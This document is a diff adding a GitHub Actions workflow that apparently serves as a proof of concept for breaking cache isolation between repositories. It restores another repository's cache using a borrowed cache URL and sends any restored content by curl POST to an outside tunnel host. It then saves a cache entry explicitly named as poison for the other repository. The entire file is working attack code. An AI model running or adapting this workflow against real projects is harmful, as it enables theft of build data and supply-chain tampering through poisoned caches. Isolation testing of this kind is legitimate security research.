@@ -1,0 +1,35 @@
+name: r7-crossrepo-via-toolkit
+on:
+  workflow_dispatch:
+jobs:
+  r7:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: cross-repo restore attempt (A token, B cache url)
+        uses: actions/cache/restore@v4
+        env:
+          ACTIONS_CACHE_URL: https://artifactcache.actions.githubusercontent.com/n5ft50z8WcFrhhMJ1iTlYJVjYGu1OWvDZCHbeZp3lDUnaBB9gW/
+        with:
+          key: nonexistent-exact-key
+          restore-keys: cacheb-marker-
+          path: ./restored-from-b/
+      - name: report restored content
+        run: |
+          set +e
+          if [ -f ./restored-from-b/marker.txt ]; then
+            echo "CROSS-REPO-RESTORE-SUCCEEDED"
+            cat ./restored-from-b/marker.txt
+            curl -sS --max-time 15 -X POST -H 'Content-Type: text/plain' --data-binary "CROSS-READ-OK: $(cat ./restored-from-b/marker.txt)" https://speak-situations-pacific-myers.trycloudflare.com/cross-read-result
+          else
+            echo "no file restored (expected if scope enforced)"
+            ls -la ./restored-from-b/ 2>&1 | head -3
+          fi
+      - name: cross-repo save attempt (A token, B cache url)
+        uses: actions/cache/save@v4
+        env:
+          ACTIONS_CACHE_URL: https://artifactcache.actions.githubusercontent.com/n5ft50z8WcFrhhMJ1iTlYJVjYGu1OWvDZCHbeZp3lDUnaBB9gW/
+        with:
+          key: cacheb-marker-poison-from-a
+          path: ./marker.txt
